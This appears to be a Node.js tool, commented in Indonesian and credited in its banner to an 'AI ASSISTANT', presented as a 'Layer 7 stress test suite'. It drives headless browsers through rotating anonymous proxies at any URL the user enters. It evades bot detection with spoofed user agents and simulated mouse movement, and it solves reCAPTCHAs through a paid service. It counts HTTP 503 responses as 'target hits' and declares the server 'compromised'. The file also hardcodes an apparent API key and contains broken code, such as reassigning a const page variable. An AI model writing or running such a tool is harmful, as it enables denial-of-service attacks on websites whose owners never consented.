const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const randomUseragent = require('random-useragent');
const { Solver } = require('@2captcha/captcha-solver');
const readline = require('readline');
const chalk = require('chalk');
const cliProgress = require('cli-progress');
const si = require('systeminformation');
const figlet = require('figlet');
const { URL } = require('url');
const os = require('os');

// Gunakan stealth plugin
puppeteer.use(StealthPlugin());

// Konfigurasi Default
const DEFAULT_CONFIG = {
    maxConcurrent: 3, // Dikurangi untuk menghindari resource overload
    requestsPerInstance: 15, // Dikurangi untuk stabilitas
    proxyRefreshInterval: 5,
    timeout: 60000, // Diperpanjang untuk stabilitas
    outputDir: './results',
    proxyApiUrl: 'http://pubproxy.com/api/proxy?format=json&limit=5&level=anonymous&speed=5&country=us&type=http',
    captchaApiKey: '50d46ce959068b82299c9f2da49528ad',
    minDelay: 2000, // Diperpanjang untuk menghindari deteksi
    maxDelay: 5000,
    scrollBehavior: true,
    mouseMovement: true,
    typingSimulation: true,
    captchaTimeout: 120000,
    targetStatusCode: 503,
    maxRetries: 3,
    mode: 'balanced',
    autoDetectProtection: true,
    resourceMonitoring: true,
    maxCpuUsage: 80,
    maxRamUsage: 80,
    logLevel: 'info',
    // Browser configuration
    browserArgs: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--no-first-run',
        '--no-zygote',
        '--disable-gpu',
        '--disable-web-security',
        '--disable-features=IsolateOrigins,site-per-process',
        '--disable-blink-features=AutomationControlled',
        '--disable-background-timer-throttling',
        '--disable-renderer-backgrounding',
        '--disable-backgrounding-occluded-windows',
        '--disable-client-side-phishing-detection',
        '--disable-crash-reporter',
        '--disable-extensions',
        '--disable-features=TranslateUI',
        '--disable-ipc-flooding-protection',
        '--disable-popup-blocking',
        '--disable-prompt-on-repost',
        '--disable-renderer-backgrounding',
        '--disable-sync',
        '--force-color-profile=srgb',
        '--metrics-recording-only',
        '--no-first-run',
        '--safebrowsing-disable-auto-update',
        '--enable-automation',
        '--password-store=basic',
        '--use-mock-keychain'
    ],
    // Retry configuration
    maxBrowserRetries: 3,
    browserRetryDelay: 5000
};

// Variabel global
let CONFIG = { ...DEFAULT_CONFIG };
let targetUrl = '';
let proxyList = [];
let activeProxies = new Set();
let requestCount = 0;
let successCount = 0;
let errorCount = 0;
let targetStatusCount = 0;
let captchaSolvedCount = 0;
let protectionType = 'unknown';
let progressBar;
let logStream;
let systemInfo = {};

// Inisialisasi readline
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Fungsi untuk menampilkan ASCII art dengan animasi
function showBanner() {
    console.clear();
    console.log(chalk.hex('#00ff00').bold(figlet.textSync('CYBER STRESS', { font: 'Small' })));
    console.log(chalk.hex('#00ff00').bold('╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗'));
    console.log(chalk.hex('#00ff00').bold('║                                        LAYER 7 STRESS TEST SUITE v2.0                                              ║'));
    console.log(chalk.hex('#00ff00').bold('║                                              [AUTHOR: AI ASSISTANT]                                                   ║'));
    console.log(chalk.hex('#00ff00').bold('╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝'));
    console.log('');
}

// Fungsi logging dengan gaya hacker
function log(level, message) {
    const timestamp = new Date().toISOString();
    let prefix, color;
    
    switch(level) {
        case 'error':
            prefix = '[✖]';
            color = chalk.hex('#ff0000');
            break;
        case 'warn':
            prefix = '[⚠]';
            color = chalk.hex('#ffff00');
            break;
        case 'success':
            prefix = '[✓]';
            color = chalk.hex('#00ff00');
            break;
        case 'info':
            prefix = '[i]';
            color = chalk.hex('#00ffff');
            break;
        case 'debug':
            prefix = '[#]';
            color = chalk.hex('#ff00ff');
            break;
        default:
            prefix = '[*]';
            color = chalk.white;
    }
    
    const logMessage = `${color(prefix)} ${chalk.white(timestamp)} ${message}`;
    console.log(logMessage);
    
    if (logStream) {
        logStream.write(`[${level.toUpperCase()}] ${timestamp} ${message}\n`);
    }
}

// Fungsi untuk animasi ketik
function typeWriter(text, speed = 50) {
    return new Promise(resolve => {
        let i = 0;
        const interval = setInterval(() => {
            if (i < text.length) {
                process.stdout.write(chalk.hex('#00ff00')(text.charAt(i)));
                i++;
            } else {
                clearInterval(interval);
                process.stdout.write('\n');
                resolve();
            }
        }, speed);
    });
}

// Fungsi untuk mendapatkan informasi sistem
async function getSystemInfo() {
    try {
        const cpu = await si.cpu();
        const mem = await si.mem();
        const osInfo = await si.osInfo();
        
        systemInfo = {
            platform: osInfo.platform,
            arch: osInfo.arch,
            cpu: cpu.model,
            totalMem: Math.round(mem.total / 1024 / 1024 / 1024) + 'GB',
            nodeVersion: process.version,
            puppeteerVersion: require('puppeteer/package.json').version
        };
        
        log('debug', `System Info: ${JSON.stringify(systemInfo)}`);
    } catch (error) {
        log('warn', `Failed to get system info: ${error.message}`);
    }
}

// Fungsi validasi URL yang diperbaiki
function isValidUrl(urlString) {
    try {
        let normalizedUrl = urlString.trim();
        
        if (!normalizedUrl.startsWith('http://') && !normalizedUrl.startsWith('https://')) {
            normalizedUrl = 'https://' + normalizedUrl;
        }
        
        const urlObj = new URL(normalizedUrl);
        
        if (!urlObj.hostname || urlObj.hostname.length === 0) {
            throw new Error('Hostname tidak valid');
        }
        
        const tldMatch = urlObj.hostname.match(/\.([a-z]{2,})$/i);
        if (!tldMatch) {
            throw new Error('TLD tidak valid');
        }
        
        return normalizedUrl;
    } catch (error) {
        throw new Error(`URL tidak valid: ${error.message}`);
    }
}

// Fungsi spinner sederhana
class SimpleSpinner {
    constructor(text) {
        this.text = text;
        this.frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
        this.frameIndex = 0;
        this.interval = null;
        this.isRunning = false;
    }
    
    start() {
        if (this.isRunning) return;
        this.isRunning = true;
        
        process.stdout.write('\n');
        this.interval = setInterval(() => {
            process.stdout.write(`\r${chalk.hex('#00ff00')(this.frames[this.frameIndex])} ${chalk.white(this.text)}`);
            this.frameIndex = (this.frameIndex + 1) % this.frames.length;
        }, 100);
    }
    
    stop() {
        if (!this.isRunning) return;
        this.isRunning = false;
        clearInterval(this.interval);
        process.stdout.write('\r \n');
    }
    
    succeed(message) {
        this.stop();
        log('success', message);
    }
    
    fail(message) {
        this.stop();
        log('error', message);
    }
    
    warn(message) {
        this.stop();
        log('warn', message);
    }
}

// Fungsi untuk input manual target URL
async function getTargetUrl() {
    return new Promise((resolve) => {
        const askForUrl = () => {
            rl.question(chalk.hex('#00ff00')('[TARGET] Masukkan URL: '), async (url) => {
                try {
                    targetUrl = isValidUrl(url);
                    
                    const spinner = new SimpleSpinner('Memvalidasi target...');
                    spinner.start();
                    
                    try {
                        await axios.get(targetUrl, {
                            timeout: 5000,
                            validateStatus: function (status) {
                                return status >= 200 && status < 500;
                            }
                        });
                        spinner.succeed(`Target valid dan dapat diakses: ${targetUrl}`);
                        resolve();
                    } catch (accessError) {
                        spinner.warn(`Target tidak dapat diakses, tapi URL valid`);
                        rl.question(chalk.hex('#00ff00')('[TARGET] Lanjutkan anyway? (y/n): '), (answer) => {
                            if (answer.toLowerCase() === 'y' || answer.toLowerCase() === 'yes') {
                                spinner.succeed(`Melanjutkan dengan target: ${targetUrl}`);
                                resolve();
                            } else {
                                askForUrl();
                            }
                        });
                    }
                } catch (validationError) {
                    log('error', validationError.message);
                    log('info', 'Contoh URL valid: https://example.com atau example.com');
                    askForUrl();
                }
            });
        };
        
        askForUrl();
    });
}

// Fungsi untuk memilih mode
async function selectMode() {
    return new Promise((resolve) => {
        console.log('');
        console.log(chalk.hex('#00ff00').bold('[MODE] Pilih mode operasi:'));
        console.log(chalk.hex('#00ffff')('  1. ') + chalk.white('BALANCED') + chalk.gray(' - Keseimbangan stealth & kecepatan'));
        console.log(chalk.hex('#00ffff')('  2. ') + chalk.white('AGGRESSIVE') + chalk.gray(' - Fokus beban tinggi'));
        console.log(chalk.hex('#00ffff')('  3. ') + chalk.white('STEALTH') + chalk.gray(' - Fokus menghindari deteksi'));
        console.log('');
        
        const askForMode = () => {
            rl.question(chalk.hex('#00ff00')('[MODE] Pilih (1-3): '), (answer) => {
                switch(answer) {
                    case '1':
                        CONFIG.mode = 'balanced';
                        break;
                    case '2':
                        CONFIG.mode = 'aggressive';
                        CONFIG.maxConcurrent = 5;
                        CONFIG.requestsPerInstance = 30;
                        CONFIG.minDelay = 1000;
                        CONFIG.maxDelay = 3000;
                        CONFIG.scrollBehavior = false;
                        CONFIG.mouseMovement = false;
                        CONFIG.typingSimulation = false;
                        break;
                    case '3':
                        CONFIG.mode = 'stealth';
                        CONFIG.maxConcurrent = 2;
                        CONFIG.requestsPerInstance = 10;
                        CONFIG.minDelay = 3000;
                        CONFIG.maxDelay = 8000;
                        CONFIG.scrollBehavior = true;
                        CONFIG.mouseMovement = true;
                        CONFIG.typingSimulation = true;
                        break;
                    default:
                        log('warn', 'Mode tidak valid! Pilih 1-3');
                        askForMode();
                        return;
                }
                
                const modeColors = {
                    balanced: chalk.hex('#ffff00'),
                    aggressive: chalk.hex('#ff0000'),
                    stealth: chalk.hex('#00ff00')
                };
                
                log('success', `Mode aktif: ${modeColors[CONFIG.mode](CONFIG.mode.toUpperCase())}`);
                resolve();
            });
        };
        
        askForMode();
    });
}

// Fungsi untuk auto-detect proteksi
async function detectProtection() {
    if (!CONFIG.autoDetectProtection) return;
    
    const spinner = new SimpleSpinner('Mendeteksi proteksi target...');
    spinner.start();
    
    try {
        const response = await axios.get(targetUrl, {
            timeout: 10000,
            headers: {
                'User-Agent': randomUseragent.getRandom()
            },
            validateStatus: function (status) {
                return status < 500;
            }
        });
        
        const headers = response.headers;
        const server = (headers.server || '').toLowerCase();
        const poweredBy = (headers['x-powered-by'] || '').toLowerCase();
        
        if (server.includes('cloudflare') || poweredBy.includes('cloudflare')) {
            protectionType = 'cloudflare';
            spinner.succeed(`Proteksi terdeteksi: ${chalk.hex('#ff6600')('CLOUDFLARE')}`);
            
            if (CONFIG.mode === 'balanced') {
                CONFIG.scrollBehavior = true;
                CONFIG.mouseMovement = true;
                CONFIG.minDelay = 2000;
                CONFIG.maxDelay = 5000;
            }
        } else if (server.includes('nginx')) {
            protectionType = 'nginx';
            spinner.succeed(`Proteksi terdeteksi: ${chalk.hex('#00ff00')('NGINX')}`);
        } else if (server.includes('apache')) {
            protectionType = 'apache';
            spinner.succeed(`Proteksi terdeteksi: ${chalk.hex('#0099ff')('APACHE')}`);
        } else {
            protectionType = 'unknown';
            spinner.warn('Proteksi tidak dikenali');
        }
    } catch (error) {
        spinner.fail(`Gagal mendeteksi proteksi: ${error.message}`);
        protectionType = 'unknown';
    }
}

// Fungsi untuk monitoring resource
async function monitorResources() {
    if (!CONFIG.resourceMonitoring) return;
    
    try {
        const cpu = await si.currentLoad();
        const mem = await si.mem();
        
        const cpuUsage = cpu.currentLoad;
        const memUsage = (mem.used / mem.total) * 100;
        
        const cpuColor = cpuUsage > CONFIG.maxCpuUsage ? chalk.hex('#ff0000') : 
                         cpuUsage > CONFIG.maxCpuUsage * 0.8 ? chalk.hex('#ffff00') : chalk.hex('#00ff00');
        
        const memColor = memUsage > CONFIG.maxRamUsage ? chalk.hex('#ff0000') : 
                         memUsage > CONFIG.maxRamUsage * 0.8 ? chalk.hex('#ffff00') : chalk.hex('#00ff00');
        
        log('debug', `Resource: CPU ${cpuColor(cpuUsage.toFixed(1) + '%')} | RAM ${memColor(memUsage.toFixed(1) + '%')}`);
        
        if (cpuUsage > CONFIG.maxCpuUsage || memUsage > CONFIG.maxRamUsage) {
            const reduction = Math.ceil(CONFIG.maxConcurrent * 0.2);
            CONFIG.maxConcurrent = Math.max(1, CONFIG.maxConcurrent - reduction);
            log('warn', `Resource overload! Mengurangi instances menjadi ${CONFIG.maxConcurrent}`);
        }
    } catch (error) {
        log('error', `Resource monitor error: ${error.message}`);
    }
}

// Fungsi untuk mendapatkan proxy
async function fetchProxies() {
    const spinner = new SimpleSpinner('Mengambil proxy...');
    spinner.start();
    
    try {
        const response = await axios.get(CONFIG.proxyApiUrl, {
            timeout: 15000,
            validateStatus: function (status) {
                return status === 200;
            }
        });
        
        if (response.data && response.data.data && Array.isArray(response.data.data)) {
            const newProxies = response.data.data.map(p => ({
                ip: p.ip,
                port: p.port,
                type: p.type || 'http',
                lastChecked: p.last_checked
            })).filter(p => p.ip && p.port);
            
            proxyList = newProxies.filter(p => !activeProxies.has(`${p.ip}:${p.port}`));
            
            if (proxyList.length > 0) {
                spinner.succeed(`Proxy diperoleh: ${proxyList.length} proxy`);
                return true;
            } else {
                spinner.warn('Tidak ada proxy baru tersedia');
                return false;
            }
        } else {
            spinner.fail('Respon proxy tidak valid');
            return false;
        }
    } catch (error) {
        spinner.fail(`Proxy error: ${error.message}`);
        return false;
    }
}

// Fungsi untuk mendapatkan proxy acak
function getRandomProxy() {
    if (proxyList.length === 0) return null;
    
    const randomIndex = Math.floor(Math.random() * proxyList.length);
    const proxy = proxyList[randomIndex];
    activeProxies.add(`${proxy.ip}:${proxy.port}`);
    return proxy;
}

// Fungsi untuk melepaskan proxy
function releaseProxy(proxy) {
    if (proxy) {
        activeProxies.delete(`${proxy.ip}:${proxy.port}`);
    }
}

// Fungsi untuk meluncurkan browser dengan retry mechanism
async function launchBrowserWithRetry(proxy, instanceId) {
    let retryCount = 0;
    let lastError = null;
    
    while (retryCount < CONFIG.maxBrowserRetries) {
        try {
            log('debug', `Instance ${instanceId}: Launching browser (attempt ${retryCount + 1})`);
            
            // Prepare browser arguments
            const browserArgs = [...CONFIG.browserArgs];
            if (proxy) {
                browserArgs.unshift(`--proxy-server=${proxy.type}://${proxy.ip}:${proxy.port}`);
            }
            
            // Platform-specific adjustments
            if (systemInfo.platform === 'linux') {
                browserArgs.push('--disable-seccomp-filter-sandbox');
            }
            
            // Launch browser
            const browser = await puppeteer.launch({
                headless: 'new',
                args: browserArgs,
                ignoreHTTPSErrors: true,
                timeout: CONFIG.timeout
            });
            
            log('success', `Instance ${instanceId}: Browser launched successfully`);
            return browser;
            
        } catch (error) {
            lastError = error;
            retryCount++;
            log('warn', `Instance ${instanceId}: Browser launch failed (attempt ${retryCount}/${CONFIG.maxBrowserRetries}) - ${error.message}`);
            
            if (retryCount < CONFIG.maxBrowserRetries) {
                log('info', `Instance ${instanceId}: Retrying in ${CONFIG.browserRetryDelay}ms...`);
                await new Promise(resolve => setTimeout(resolve, CONFIG.browserRetryDelay));
            }
        }
    }
    
    throw new Error(`Failed to launch browser after ${CONFIG.maxBrowserRetries} attempts. Last error: ${lastError.message}`);
}

// Fungsi untuk simulasi pergerakan mouse
async function humanMouseMovement(page) {
    if (!CONFIG.mouseMovement) return;
    
    const viewport = await page.viewport();
    const moves = 5 + Math.floor(Math.random() * 10);
    
    for (let i = 0; i < moves; i++) {
        const x = Math.floor(Math.random() * viewport.width);
        const y = Math.floor(Math.random() * viewport.height);
        
        await page.mouse.move(x, y, {
            steps: 10 + Math.floor(Math.random() * 20)
        });
        
        await page.waitForTimeout(100 + Math.random() * 500);
    }
}

// Fungsi untuk simulasi scroll
async function humanScroll(page) {
    if (!CONFIG.scrollBehavior) return;
    
    const scrollCount = 3 + Math.floor(Math.random() * 5);
    const scrollDelay = 800 + Math.random() * 1500;
    
    for (let i = 0; i < scrollCount; i++) {
        await page.evaluate(() => {
            window.scrollBy(0, window.innerHeight * (0.3 + Math.random() * 0.7));
        });
        
        await page.waitForTimeout(scrollDelay);
    }
    
    await page.evaluate(() => {
        window.scrollTo(0, 0);
    });
}

// Fungsi untuk simulasi pengetikan
async function humanType(page, selector, text) {
    if (!CONFIG.typingSimulation) {
        await page.type(selector, text);
        return;
    }
    
    await page.focus(selector);
    
    for (const char of text) {
        await page.keyboard.type(char, {
            delay: 50 + Math.random() * 150
        });
        await page.waitForTimeout(20 + Math.random() * 100);
    }
}

// Fungsi untuk menyelesaikan CAPTCHA
async function solveCaptcha(page) {
    if (!CONFIG.captchaApiKey || CONFIG.captchaApiKey === 'YOUR_2CAPTCHA_API_KEY_HERE') {
        return false;
    }
    
    const spinner = new SimpleSpinner('Memecahkan CAPTCHA...');
    spinner.start();
    
    try {
        const captchaFrames = await page.$$('iframe[title*="reCAPTCHA"], iframe[src*="recaptcha"]');
        if (captchaFrames.length === 0) {
            spinner.stop();
            return false;
        }
        
        const siteKey = await page.evaluate(() => {
            const iframe = document.querySelector('iframe[title*="reCAPTCHA"], iframe[src*="recaptcha"]');
            if (!iframe) return null;
            const src = iframe.getAttribute('src');
            const match = src.match(/k=([^&]+)/);
            return match ? match[1] : null;
        });
        
        if (!siteKey) {
            spinner.fail('Site key tidak ditemukan');
            return false;
        }
        
        const solver = new Solver(CONFIG.captchaApiKey);
        const { id } = await Promise.race([
            solver.recaptcha({
                googlekey: siteKey,
                pageurl: targetUrl
            }),
            new Promise((_, reject) => 
                setTimeout(() => reject(new Error('CAPTCHA timeout')), CONFIG.captchaTimeout)
            )
        ]);
        
        spinner.text = 'Menunggu solusi CAPTCHA...';
        
        const { code } = await Promise.race([
            solver.waitForResult(id),
            new Promise((_, reject) => 
                setTimeout(() => reject(new Error('CAPTCHA timeout')), CONFIG.captchaTimeout)
            )
        ]);
        
        await page.evaluate((token) => {
            const textarea = document.getElementById('g-recaptcha-response');
            if (textarea) textarea.innerHTML = token;
        }, code);
        
        captchaSolvedCount++;
        spinner.succeed('CAPTCHA cracked!');
        return true;
    } catch (error) {
        spinner.fail(`CAPTCHA error: ${error.message}`);
        return false;
    }
}

// Fungsi untuk menjalankan instance browser
async function runBrowserInstance(instanceId) {
    let browser = null;
    let proxy = null;
    let retryCount = 0;
    
    try {
        proxy = getRandomProxy();
        if (!proxy) {
            log('warn', `Instance ${instanceId}: Proxy tidak tersedia`);
            return;
        }

        log('info', `Instance ${instanceId}: Memulai dengan proxy ${chalk.hex('#ff00ff')(`${proxy.ip}:${proxy.port}`)}`);

        // Launch browser with retry mechanism
        browser = await launchBrowserWithRetry(proxy, instanceId);

        const userAgent = randomUseragent.getRandom();
        const viewport = {
            width: 1200 + Math.floor(Math.random() * 400),
            height: 700 + Math.floor(Math.random() * 300),
            deviceScaleFactor: 1,
            isMobile: false,
            hasTouch: false
        };

        const page = await browser.newPage();
        await page.setUserAgent(userAgent);
        await page.setViewport(viewport);
        await page.setDefaultTimeout(CONFIG.timeout);

        // Block unnecessary resources for performance
        await page.setRequestInterception(true);
        page.on('request', (req) => {
            const resourceType = req.resourceType();
            if (resourceType === 'image' || resourceType === 'stylesheet' || resourceType === 'font') {
                req.abort();
            } else {
                req.continue();
            }
        });

        for (let i = 0; i < CONFIG.requestsPerInstance; i++) {
            try {
                if (i > 0 && i % CONFIG.proxyRefreshInterval === 0) {
                    releaseProxy(proxy);
                    proxy = getRandomProxy();
                    if (!proxy) break;
                    
                    await browser.close();
                    browser = await launchBrowserWithRetry(proxy, instanceId);
                    
                    page = await browser.newPage();
                    await page.setUserAgent(userAgent);
                    await page.setViewport(viewport);
                    await page.setDefaultTimeout(CONFIG.timeout);
                    
                    await page.setRequestInterception(true);
                    page.on('request', (req) => {
                        const resourceType = req.resourceType();
                        if (resourceType === 'image' || resourceType === 'stylesheet' || resourceType === 'font') {
                            req.abort();
                        } else {
                            req.continue();
                        }
                    });
                }

                const response = await page.goto(targetUrl, { 
                    waitUntil: 'domcontentloaded',
                    timeout: CONFIG.timeout 
                });

                const status = response.status();
                
                if (status === CONFIG.targetStatusCode) {
                    targetStatusCount++;
                    log('success', `Instance ${instanceId}: Request ${i + 1} - ${chalk.hex('#ff0000')('TARGET HIT!')} Status ${status}`);
                    
                    await page.screenshot({ 
                        path: path.join(CONFIG.outputDir, `instance_${instanceId}_target_${targetStatusCount}.png`) 
                    });
                } else {
                    log('info', `Instance ${instanceId}: Request ${i + 1} - Status ${chalk.hex('#00ffff')(status)}`);
                }

                requestCount++;
                
                if (status === 403) {
                    await solveCaptcha(page);
                }

                if (CONFIG.mode === 'stealth' || CONFIG.mode === 'balanced') {
                    await humanMouseMovement(page);
                    await humanScroll(page);
                }

                const delay = CONFIG.minDelay + Math.random() * (CONFIG.maxDelay - CONFIG.minDelay);
                await page.waitForTimeout(delay);
                
                if (progressBar) {
                    progressBar.update(requestCount);
                }
                
            } catch (error) {
                requestCount++;
                errorCount++;
                retryCount++;
                
                log('error', `Instance ${instanceId}: Request ${i + 1} gagal - ${error.message}`);
                
                if (retryCount <= CONFIG.maxRetries) {
                    log('info', `Instance ${instanceId}: Retry ${retryCount}/${CONFIG.maxRetries}`);
                    i--;
                    continue;
                }
                
                retryCount = 0;
                
                if (errorCount > requestCount * 0.7) {
                    log('warn', `Instance ${instanceId}: Error rate tinggi, menghentikan instance`);
                    break;
                }
            }
        }
    } catch (error) {
        log('error', `Instance ${instanceId}: Browser error - ${error.message}`);
    } finally {
        if (browser) {
            try {
                await browser.close();
            } catch (closeError) {
                log('warn', `Instance ${instanceId}: Error closing browser - ${closeError.message}`);
            }
        }
        if (proxy) releaseProxy(proxy);
        log('info', `Instance ${instanceId}: Selesai`);
    }
}

// Fungsi untuk menampilkan hasil akhir
function displayResults() {
    console.log('');
    console.log(chalk.hex('#00ff00').bold('╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗'));
    console.log(chalk.hex('#00ff00').bold('║                                              MISSION REPORT                                                     ║'));
    console.log(chalk.hex('#00ff00').bold('╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝'));
    console.log('');
    
    const stats = [
        { label: 'Total Request', value: requestCount, color: chalk.white },
        { label: 'Success', value: `${successCount} (${(successCount/requestCount*100).toFixed(2)}%)`, color: chalk.hex('#00ff00') },
        { label: 'Failed', value: `${errorCount} (${(errorCount/requestCount*100).toFixed(2)}%)`, color: chalk.hex('#ff0000') },
        { label: 'Target Hit', value: `${targetStatusCount} (${(targetStatusCount/requestCount*100).toFixed(2)}%)`, color: chalk.hex('#ff00ff') },
        { label: 'CAPTCHA Cracked', value: captchaSolvedCount, color: chalk.hex('#ffff00') },
        { label: 'Mode', value: CONFIG.mode.toUpperCase(), color: chalk.hex('#00ffff') },
        { label: 'Protection', value: protectionType.toUpperCase(), color: chalk.hex('#ff9900') }
    ];
    
    const maxLength = Math.max(...stats.map(s => s.label.length));
    
    stats.forEach(stat => {
        const padding = ' '.repeat(maxLength - stat.label.length + 2);
        console.log(chalk.hex('#00ff00')(`[${stat.label}]${padding}`) + stat.color(stat.value));
    });
    
    console.log('');
    
    if (targetStatusCount > 0) {
        console.log(chalk.hex('#00ff00').bold('╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗'));
        console.log(chalk.hex('#00ff00').bold('║                                              MISSION SUCCESS                                                     ║'));
        console.log(chalk.hex('#00ff00').bold('║                                        Target server has been compromised!                                         ║'));
        console.log(chalk.hex('#00ff00').bold('╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝'));
    } else {
        console.log(chalk.hex('#ffff00').bold('╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗'));
        console.log(chalk.hex('#ffff00').bold('║                                              MISSION FAILED                                                      ║'));
        console.log(chalk.hex('#ffff00').bold('║                                        Target server still operational!                                         ║'));
        console.log(chalk.hex('#ffff00').bold('╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝'));
    }
}

// Fungsi utama
async function main() {
    showBanner();
    
    await typeWriter('Initializing cyber stress test suite...', 50);
    await new Promise(resolve => setTimeout(resolve, 500));
    
    // Get system information
    await getSystemInfo();
    
    // Create output directory
    if (!fs.existsSync(CONFIG.outputDir)) {
        fs.mkdirSync(CONFIG.outputDir);
    }

    // Setup log file
    const logFileName = `cyber_test_${new Date().toISOString().replace(/[:.]/g, '-')}.log`;
    logStream = fs.createWriteStream(path.join(CONFIG.outputDir, logFileName), { flags: 'a' });

    // Input target URL
    await getTargetUrl();

    // Select mode
    await selectMode();

    // Detect protection
    await detectProtection();

    // Setup progress bar
    const totalRequests = CONFIG.maxConcurrent * CONFIG.requestsPerInstance;
    progressBar = new cliProgress.SingleBar({
        format: 'Progress |' + chalk.hex('#00ff00')('{bar}') + '| {percentage}% | {value}/{total} | ETA: {eta}s',
        barCompleteChar: '█',
        barIncompleteChar: '░',
        hideCursor: true
    });
    progressBar.start(totalRequests, 0);

    log('info', `Target: ${targetUrl}`);
    log('info', `Mode: ${CONFIG.mode}`);
    log('info', `Protection: ${protectionType}`);
    log('info', `Config: ${CONFIG.maxConcurrent} instances, ${CONFIG.requestsPerInstance} requests/instance`);

    // Fetch initial proxies
    const proxySuccess = await fetchProxies();
    if (!proxySuccess) {
        log('error', 'Tidak dapat memulai tanpa proxy. Keluar...');
        progressBar.stop();
        rl.close();
        if (logStream) logStream.end();
        return;
    }

    // Setup resource monitoring
    let resourceMonitor;
    if (CONFIG.resourceMonitoring) {
        resourceMonitor = setInterval(monitorResources, 30000);
    }

    // Run instances
    const instances = [];
    for (let i = 1; i <= CONFIG.maxConcurrent; i++) {
        instances.push(runBrowserInstance(i));
        await new Promise(resolve => setTimeout(resolve, 3000)); // Increased delay between instances
    }

    // Wait for all instances to complete
    await Promise.all(instances);

    // Stop progress bar and monitoring
    progressBar.stop();
    if (resourceMonitor) clearInterval(resourceMonitor);

    // Display results
    displayResults();

    rl.close();
    if (logStream) logStream.end();
}

// Jalankan program
main().catch(error => {
    log('error', `Fatal error: ${error.message}`);
    if (progressBar) progressBar.stop();
    rl.close();
    if (logStream) logStream.end();
    process.exit(1);
});
